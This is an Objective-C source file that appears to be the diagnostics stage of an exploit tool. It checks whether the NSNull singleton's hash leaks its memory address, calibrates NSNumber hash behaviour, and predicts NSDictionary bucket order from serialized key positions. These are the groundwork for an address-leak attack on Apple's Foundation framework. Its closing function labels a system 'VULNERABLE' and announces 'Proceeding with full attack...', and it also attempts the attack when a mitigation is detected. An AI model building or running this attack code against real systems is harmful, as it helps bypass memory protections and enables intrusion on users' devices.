#import "diagnostics.h"
#import "hash-utils.h"
#import "dict-builder.h"
#include <stdio.h>
#include <unistd.h>

void test_nsnull_hash_stability(void) {
    NSNull *null1 = [NSNull null];
    NSNull *null2 = [NSNull null];

    uintptr_t addr = (uintptr_t)null1;
    NSUInteger hash = [null1 hash];

    printf("[Diagnostic] NSNull singleton address: 0x%lx\n", addr);
    printf("[Diagnostic] NSNull hash value:         0x%lx\n", (unsigned long)hash);
    printf("[Diagnostic] Hash == Address:           %s\n",
           (hash == addr) ? "YES (vulnerable)" : "NO (possibly patched)");
    printf("[Diagnostic] Singleton identity:        %s\n",
           (null1 == null2) ? "YES" : "NO");
}

void test_hash_determinism(void) {
    NSNull *null = [NSNull null];
    NSUInteger hash1 = [null hash];

    // Force re-computation if possible
    sleep(1);
    NSUInteger hash2 = [null hash];

    printf("[Diagnostic] First hash:  0x%lx\n", (unsigned long)hash1);
    printf("[Diagnostic] Second hash: 0x%lx\n", (unsigned long)hash2);
    printf("[Diagnostic] Deterministic: %s\n",
           (hash1 == hash2) ? "YES" : "NO (randomized per-run)");
}

void test_serialization_order(void) {
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];

    // Insert in controlled order
    dict[@1] = @"first";
    dict[@2] = @"second";
    dict[[NSNull null]] = @"null";
    dict[@3] = @"third";

    printf("[Diagnostic] Serialization test:\n");
    NSUInteger idx = 0;
    NSArray *keys = extract_serialized_keys(dict);
    if (!keys) {
        printf("  [Error] Failed to parse serialized key order\n");
        return;
    }
    for (id key in keys) {
        const char *keyType = [key isKindOfClass:[NSNull class]] ? "NSNull" : "NSNumber";
        printf("  Position %lu: %s\n", (unsigned long)idx++, keyType);
    }
}

void test_nsnumber_hash_behavior(void) {
    uint64_t detected = 0;
    bool linear = calibrate_nsnumber_hash_multiplier(&detected, 10);

    printf("[Diagnostic] NSNumber hash tests:\n");
    if (linear) {
        printf("  Detected multiplier: 0x%llx (linear)\n", detected);
    } else {
        printf("  Hash appears non-linear; using fallback bucket search\n");
    }

    for (int i = 0; i < 10; i++) {
        NSNumber *num = @(i);
        NSUInteger hash = [num hash];
        uint64_t expected = (uint64_t)i * get_hash_multiplier();

        if (linear) {
            printf("  @%d: hash=0x%lx, expected=0x%llx, %s\n",
                   i, (unsigned long)hash, expected,
                   (hash == expected) ? "MATCH" : "DIFFERENT");
        } else {
            printf("  @%d: hash=0x%lx\n", i, (unsigned long)hash);
        }
    }
}

void test_bucket_prediction(void) {
    // Create a small dictionary and verify we can predict positions
    NSMutableDictionary *dict = [NSMutableDictionary dictionary];

    uint64_t prime = 23;

    // Calculate keys that should occupy even buckets
    for (uint64_t bucket = 0; bucket < prime; bucket += 2) {
        uint64_t key_value;
        if (find_key_for_bucket(bucket, prime, &key_value)) {
            dict[@(key_value)] = @(bucket);
        }
    }

    dict[[NSNull null]] = @"marker";

    printf("[Diagnostic] Bucket prediction test (table size %llu):\n", prime);
    NSUInteger position = 0;
    NSArray *keys = extract_serialized_keys(dict);
    if (!keys) {
        printf("  [Error] Failed to parse serialized key order\n");
        return;
    }
    bool order_ok = validate_bucket_order(keys, prime, PATTERN_EVEN);
    printf("  Order validation: %s\n", order_ok ? "OK" : "MISMATCH");
    for (id key in keys) {
        if ([key isKindOfClass:[NSNull class]]) {
            printf("  NSNull found at position %lu\n", (unsigned long)position);

            // The position tells us about the hash
            printf("  This indicates bucket placement is deterministic\n");
            break;
        }
        position++;
    }
}

bool run_diagnostics(void) {
    printf("========================================\n");
    printf("Hash Behavior Diagnostics\n");
    printf("========================================\n\n");

    test_nsnull_hash_stability();
    printf("\n");

    test_hash_determinism();
    printf("\n");

    test_serialization_order();
    printf("\n");

    test_nsnumber_hash_behavior();
    printf("\n");

    test_bucket_prediction();
    printf("\n");

    // Determine if system appears vulnerable
    NSNull *null = [NSNull null];
    uintptr_t addr = (uintptr_t)null;
    NSUInteger hash = [null hash];

    bool appears_vulnerable = (hash == addr);

    printf("========================================\n");
    if (appears_vulnerable) {
        printf("Assessment: System appears VULNERABLE\n");
        printf("Proceeding with full attack...\n");
    } else {
        printf("Assessment: Mitigation detected\n");
        printf("Attack unlikely to succeed, but attempting anyway for research...\n");
    }
    printf("========================================\n\n");

    return appears_vulnerable;
}
